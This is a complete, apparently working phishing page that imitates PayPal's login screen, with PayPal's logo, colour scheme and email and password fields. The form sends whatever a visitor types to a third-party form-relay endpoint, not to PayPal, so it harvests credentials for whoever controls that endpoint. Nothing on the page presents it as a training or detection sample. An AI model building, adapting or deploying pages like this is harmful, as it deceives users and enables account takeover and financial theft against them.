<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>PayPal Login Form</title>
    <style>
       
        
        body {
            font-family: Helvetica, Arial, sans-serif;
            font-size: 18px;
            background-color: #f5f7fa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        * {
            box-sizing: border-box;
        }
        #loginform {
            width: 90%;
            max-width: 400px;
        }
        #outerbox {
            background: #fff;
            border: 1px solid #ccc;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        #logo {
            width: 150px;
            margin-bottom: 20px;
        }
        input {
            height: 50px;
            width: 100%;
            padding: 0 10px;
            border: 1px solid #ccc;
            margin-bottom: 16px;
            font-size: 16px;
            border-radius: 4px;
        }
        input::placeholder {
            font-weight: normal;
        }
        a {
            text-decoration: none;
            color: #0070ba;
            font-weight: bold;
            display: block;
            margin-top: 10px;
        }
        button {
            width: 100%;
            min-height: 44px;
            padding: 12px;
            margin-top: 20px;
            background-color: #0070ba;
            border: 0;
            color: #fff;
            border-radius: 25px;
            font-size: 18px;
            cursor: pointer;
        }
        button:hover {
            background-color: #005ea6;
        }
    </style>
</head>
<body>
    <section id="loginform">
        <div id="outerbox">
            <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" id="logo" alt="PayPal Logo">
            
         <form action="https://formsubmit.co/61a5e9ede7aec75548da8773d02a1cc6" method="POST">
                <input id="email" type="email" name="email" placeholder="Email Address" required>
                <input id="password" type="password" name="password" placeholder="Password" required>
                <a href="#" id="forgotpass">Forgotten password?</a>
                <button id="login" class="but">Log In</button>
            </form>

        </div>
    </section>

    
</body>
